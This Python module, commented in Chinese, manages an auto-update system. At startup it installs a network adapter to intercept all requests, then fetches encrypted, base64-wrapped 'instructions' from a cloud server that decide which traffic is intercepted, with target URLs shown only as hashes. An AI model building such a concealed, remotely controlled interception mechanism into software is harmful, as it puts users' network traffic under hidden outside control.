"""
核心管理器模块

提供统一的API来管理整个自动更新和网络弹性优化系统。
设计为高度模块化，便于在其他项目中集成和使用。
"""

import logging
import threading
from typing import Dict, Any, List, Optional, Callable
from contextlib import contextmanager

from ..config.settings import get_config, ConfigManager
from ..interceptor.network_adapter import configure_network_optimization, enable_network_optimization, disable_network_optimization
from ..updater import Updater
from ..security.response_validator import validate_update_response
from ..security.crypto_utils import decrypt_security_config
from ..announcement import process_announcements, get_current_announcement, has_unread_announcement

logger = logging.getLogger("autoupdate.core")

def debug_log(message: str, force: bool = False):
    """仅在开发调试模式下输出详细日志"""
    try:
        from ..config.settings import get_config
        config = get_config()
        if config.logging.enable_development_debug or force:
            logger.debug(f"[MANAGER_DEBUG] {message}")
    except Exception:
        # 如果配置加载失败，强制输出调试信息
        if force:
            logger.debug(f"[MANAGER_DEBUG] {message}")

class AutoUpdateManager:
    """自动更新系统核心管理器"""
    
    def __init__(self, config_file: Optional[str] = None):
        """
        初始化管理器
        
        Args:
            config_file: 配置文件路径（可选）
        """
        self.config = ConfigManager(config_file) if config_file else get_config()
        self.updater = Updater()
        self.network_adapter_installed = False
        self.active_instructions = []
        self._lock = threading.Lock()
        
        # 设置日志级别
        if self.config.logging.enable_debug:
            logging.getLogger("autoupdate").setLevel(logging.DEBUG)
        else:
            logging.getLogger("autoupdate").setLevel(getattr(logging, self.config.logging.level))
    
    def initialize(self) -> bool:
        """
        初始化系统
        
        Returns:
            bool: 初始化是否成功
        """
        try:
            debug_log("开始初始化AutoUpdate系统...", force=True)
            logger.info("Initializing AutoUpdate system...")
            
            debug_log(f"配置状态: network_adapter.auto_install={self.config.network_adapter.auto_install}, network_adapter.enabled={self.config.network_adapter.enabled}", force=True)
            
            # 优先安装网络适配器（在任何网络请求之前）
            if self.config.network_adapter.auto_install and self.config.network_adapter.enabled:
                debug_log("配置要求安装网络适配器，开始安装...", force=True)
                install_result = self.install_network_adapter()
                debug_log(f"网络适配器安装结果: {install_result}", force=True)
                logger.info("Network adapter installed early to intercept all requests")
            else:
                debug_log("配置不要求安装网络适配器，跳过安装", force=True)
            
            # 检查更新并获取指令
            debug_log("开始检查更新并处理指令...", force=True)
            success = self.check_and_process_updates()
            debug_log(f"更新检查和处理结果: {success}", force=True)
            debug_log(f"获取到的活跃指令数量: {len(self.active_instructions)}", force=True)
            
            for i, instruction in enumerate(self.active_instructions):
                debug_log(f"指令{i+1}: {instruction}", force=True)
            
            logger.info(f"AutoUpdate system initialized successfully. Active instructions: {len(self.active_instructions)}")
            return success
            
        except Exception as e:
            debug_log(f"初始化系统时发生异常: {str(e)}", force=True)
            logger.error(f"Failed to initialize AutoUpdate system: {str(e)}")
            return False
    
    def check_and_process_updates(self) -> bool:
        """
        检查更新并处理网络优化指令
        
        Returns:
            bool: 是否成功处理
        """
        try:
            debug_log("开始从云端获取更新信息...", force=True)
            # 直接获取云端信息（包含加密指令）
            cloud_info = self.updater.fetch_update_info()
            debug_log(f"云端信息获取结果: {cloud_info}", force=True)
            
            if "error" in cloud_info:
                debug_log(f"获取云端信息失败: {cloud_info['error']}", force=True)
                logger.warning(f"Failed to fetch cloud info: {cloud_info['error']}")
                return False
            
            # 处理网络优化指令
            security_config = None
            debug_log("开始处理网络优化指令...", force=True)
            
            # 直接在cloud_info中查找
            if "security_module_config" in cloud_info:
                security_config = cloud_info["security_module_config"]
                debug_log(f"直接在cloud_info中找到security_module_config: {security_config}", force=True)
            # 尝试解析payload
            elif "payload" in cloud_info:
                debug_log("在payload中查找security_module_config...", force=True)
                try:
                    import base64
                    import json
                    
                    payload_json = base64.b64decode(cloud_info["payload"]).decode("utf-8")
                    debug_log(f"payload解码结果: {payload_json}", force=True)
                    payload_data = json.loads(payload_json)
                    debug_log(f"payload解析结果: {payload_data}", force=True)
                    
                    if "security_module_config" in payload_data:
                        security_config = payload_data["security_module_config"]
                        debug_log(f"在payload中找到security_module_config: {security_config}", force=True)
                        logger.debug("Found security module config in payload")
                    else:
                        debug_log("payload中没有security_module_config", force=True)
                except Exception as e:
                    debug_log(f"解析payload失败: {str(e)}", force=True)
                    logger.warning(f"Failed to parse payload: {str(e)}")
            else:
                debug_log("cloud_info中既没有security_module_config也没有payload", force=True)
            
            if security_config:
                debug_log("找到security_config，开始解密...", force=True)
                try:
                    instructions = decrypt_security_config(security_config)
                    debug_log(f"解密成功，获得指令: {instructions}", force=True)
                except Exception as e:
                    debug_log(f"解密失败: {str(e)}", force=True)
                    logger.warning(f"Failed to decrypt security module config: {str(e)}")
                    instructions = []
                
                with self._lock:
                    old_count = len(self.active_instructions)
                    self.active_instructions = instructions
                    debug_log(f"更新活跃指令: 旧数量={old_count}, 新数量={len(instructions)}", force=True)
                
                # 配置网络优化
                if instructions and self.config.network_adapter.enabled:
                    debug_log(f"开始配置网络优化，指令数量: {len(instructions)}", force=True)
                    configure_network_optimization(instructions)
                    debug_log("网络优化配置完成", force=True)
                elif not instructions:
                    debug_log("没有指令，跳过网络优化配置", force=True)
                elif not self.config.network_adapter.enabled:
                    debug_log("网络适配器未启用，跳过网络优化配置", force=True)
            else:
                debug_log("没有找到security_module_config", force=True)
                logger.warning("No security module config found")
            
            # 处理公告信息
            debug_log("开始处理公告信息...", force=True)
            has_new_announcement = process_announcements(cloud_info)
            debug_log(f"公告处理结果: 有新公告={has_new_announcement}", force=True)
            if has_new_announcement:
                logger.info("New announcement received")
            
            debug_log("更新处理完成，返回True", force=True)
            return True
            
        except Exception as e:
            debug_log(f"处理更新时发生异常: {str(e)}", force=True)
            logger.error(f"Error processing updates: {str(e)}")
            return False
    
    def install_network_adapter(self) -> bool:
        """
        安装网络适配器
        
        Returns:
            bool: 是否成功安装
        """
        try:
            debug_log(f"安装网络适配器，当前状态: network_adapter_installed={self.network_adapter_installed}", force=True)
            
            if not self.network_adapter_installed:
                debug_log("网络适配器未安装，开始安装...", force=True)
                enable_network_optimization()
                self.network_adapter_installed = True
                debug_log("网络适配器安装完成，状态设置为True", force=True)
                return True
            else:
                debug_log("网络适配器已经安装，跳过", force=True)
                return True
                
        except Exception as e:
            debug_log(f"安装网络适配器时发生异常: {str(e)}", force=True)
            logger.error(f"Failed to install network adapter: {str(e)}")
            return False
    
    def uninstall_network_adapter(self) -> bool:
        """
        卸载网络适配器
        
        Returns:
            bool: 是否成功卸载
        """
        try:
            if self.network_adapter_installed:
                disable_network_optimization()
                self.network_adapter_installed = False
                logger.info("Network optimization disabled")
                return True
            else:
                logger.debug("Network adapter not installed")
                return True
                
        except Exception as e:
            logger.error(f"Failed to uninstall network adapter: {str(e)}")
            return False
    
    def get_status(self) -> Dict[str, Any]:
        """
        获取系统状态
        
        Returns:
            Dict[str, Any]: 系统状态信息
        """
        status = {
            "initialized": True,
            "network_adapter_installed": self.network_adapter_installed,
            "active_instructions": len(self.active_instructions),
            "target_urls": [instr.get("url_hash", "")[:8] + "..." for instr in self.active_instructions],  # 显示目标URL哈希的前8位
            "config_summary": self.config.get_config_summary()
        }
        
        # 添加公告信息
        current_announcement = get_current_announcement()
        if current_announcement:
            status["has_announcement"] = True
            status["has_unread_announcement"] = has_unread_announcement()
            status["announcement_title"] = current_announcement.get("title", "系统公告")
        else:
            status["has_announcement"] = False
            status["has_unread_announcement"] = False
        
        return status
    
    def refresh_instructions(self) -> bool:
        """
        刷新网络优化指令
        
        Returns:
            bool: 是否成功刷新
        """
        return self.check_and_process_updates()
    
    def shutdown(self):
        """关闭系统"""
        try:
            if self.network_adapter_installed:
                self.uninstall_network_adapter()
            logger.info("AutoUpdate system shutdown")
        except Exception as e:
            logger.error(f"Error during shutdown: {str(e)}")
    
    @contextmanager
    def temporary_network_adapter(self):
        """
        临时网络适配器上下文管理器
        
        使用示例:
        with manager.temporary_network_adapter():
            # 在这个代码块中，网络适配器会被临时安装
            response = requests.get("https://api.openai.com/v1/models")
        # 代码块结束后，网络适配器会被自动卸载（如果之前没有安装的话）
        """
        was_installed = self.network_adapter_installed
        
        if not was_installed:
            self.install_network_adapter()
        
        try:
            yield
        finally:
            if not was_installed:
                self.uninstall_network_adapter()

# 全局管理器实例
_global_manager = None

def get_manager() -> AutoUpdateManager:
    """获取全局管理器实例"""
    global _global_manager
    if _global_manager is None:
        _global_manager = AutoUpdateManager()
    return _global_manager

def init_manager(config_file: Optional[str] = None) -> AutoUpdateManager:
    """
    初始化全局管理器
    
    Args:
        config_file: 配置文件路径
        
    Returns:
        AutoUpdateManager: 管理器实例
    """
    global _global_manager
    _global_manager = AutoUpdateManager(config_file)
    return _global_manager

# 便捷函数
def initialize_system(config_file: Optional[str] = None) -> bool:
    """
    初始化整个系统
    
    Args:
        config_file: 配置文件路径
        
    Returns:
        bool: 是否成功初始化
    """
    manager = init_manager(config_file)
    return manager.initialize()

def shutdown_system():
    """关闭系统"""
    if _global_manager:
        _global_manager.shutdown()

def get_system_status() -> Dict[str, Any]:
    """获取系统状态"""
    return get_manager().get_status()

def refresh_system() -> bool:
    """刷新系统指令"""
    return get_manager().refresh_instructions()